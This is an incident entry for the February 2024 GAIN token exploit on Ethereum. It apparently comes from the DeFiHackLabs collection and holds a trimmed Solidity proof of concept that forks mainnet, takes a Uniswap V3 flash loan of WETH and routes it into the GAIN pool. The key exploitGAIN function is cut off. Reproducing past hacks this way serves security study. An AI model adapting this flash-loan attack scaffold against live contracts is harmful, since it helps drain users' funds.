# [?] GAIN - bad function implementation

## Summary
Severity: Unknown
Chain: Ethereum
Component: GAIN
Published: 2024-02-21
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/GAIN_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~6.4 ETH

```solidity
contract ContractTest is Test {
    IWETH WETH = IWETH(payable(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)));
    IERC20 GAIN = IERC20(0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac);
    Uni_Pair_V3 univ3USDT = Uni_Pair_V3(0xc7bBeC68d12a0d1830360F8Ec58fA599bA1b0e9b);
    Uni_Pair_V2 univ2GAIN = Uni_Pair_V2(0x31d80EA33271891986D873B397d849A92EF49255);
    address[] private addrPath = new address[](2);
    uint256 totalBorrowed = 0.1 ether;

    function setUp() public {
        vm.createSelectFork("mainnet", 19_277_620 - 1);
        vm.label(address(WETH), "WETH");
        vm.label(address(univ3USDT), "Uniswap V3: USDT");
        vm.label(address(univ2GAIN), "Uniswap V2: GAIN");
        approveAll();
    }

    function testExploit() external {
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = totalBorrowed;
        bytes memory userData = "";
        console.log("Before Start: %d ETH", WETH.balanceOf(address(this)));
        univ3USDT.flash(address(this), totalBorrowed, 0, userData);
        uint256 intRes = WETH.balanceOf(address(this)) / 1 ether;
        uint256 decRes = WETH.balanceOf(address(this)) - intRes * 1e18;
        console.log("Attack Exploit: %s.%s ETH", intRes, decRes);
    }

    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes memory data) external {
        WETH.transfer(address(univ2GAIN), totalBorrowed);
        exploitGAIN();
        WETH.transfer(address(univ3USDT), totalBorrowed + fee0);
    }

```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/GAIN_exp.sol_
